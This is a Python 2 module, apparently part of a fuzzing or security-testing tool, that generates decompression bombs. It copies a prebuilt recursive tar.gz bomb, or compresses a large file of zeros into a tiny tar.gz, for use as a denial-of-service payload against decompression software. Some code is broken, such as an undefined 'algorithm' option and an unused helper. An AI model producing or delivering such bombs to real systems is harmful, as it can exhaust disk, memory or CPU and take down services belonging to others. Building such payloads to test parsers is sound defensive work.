import zipfile
import gzip
import os
import shutil
import tarfile
import logging
from options import Options


options = Options()
options.add_option('type', 'recursive', 'Type of bomb', ['single_file', 'layer', 'recursive'])
options.add_option('input_budget', 500, 'Number of bytes in input budget')
options.add_option('target_size', 100000,
                   'Desired size of decompressed file; Not applicable to AC time exploits like recursive zip bombs')
options.add_option('output_file', 'output', 'Name of compressed file; Warning: Use at your own risk! Be careful!')

def run(generator, output):

    #TODO - do a check on output.OUTPUT_NAME, since it must be file

    if options['type'] == 'recursive':
        if int(options['input_budget']) > 345:
            shutil.copyfile(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/tar_gz_recursive.tar.gz',
                            options['output_file'] + '.tar.gz')
            print 'Your tar.gz bomb ' + options['output_file'] + '.tar.gz is ready in your current directory.'
        else:
            logging.warning('We do not have a recursive gz bomb small enough.')

    elif options['type'] == 'single_file':
        singlefilebomb(generator, str(options['algorithm']), int(options['input_budget']),
                            int(options['target_size']), str(options['output_file']))

    elif options['type'] == 'layer':
        logging.warning( 'Coming soon.')

def make_copies_and_compress(infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
    filename, file_extension = os.path.splitext(infile)
    for i in xrange(n_copies):
        f_name = '%s-%d.%s' % (filename, i, file_extension)
        shutil.copy(infile,f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()

def generate_dummy_file(filename,size):
    with open(filename, 'w') as dummy:
        dummy.write((size*'0'))

def tar_gz_compress_file(infile,outfile):
    def reset(tarinfo):
        tarinfo.uid = tarinfo.gid = 0
        tarinfo.uname = tarinfo.gname = 'root'
        return tarinfo
    tar = tarfile.open(outfile, 'w:gz')
    tar.add(infile, filter=reset)
    tar.close()

def singlefilebomb(generator, algorithm, input_budget, target_size, output_file):
    # Writes a dummy file dummy.txt with target_size bytes of '0'.
    # Cleans up file at end of operation, probably not the cleanest way to do this.
    generate_dummy_file('dummy.txt',target_size)

    output_file_name = output_file+'.tar.gz'
    tar_gz_compress_file('dummy.txt', output_file_name)

    os.remove('dummy.txt')
    print 'Compressed file size: %d B' % os.stat(output_file_name).st_size
    print 'Uncompressed file size: %d B' % target_size

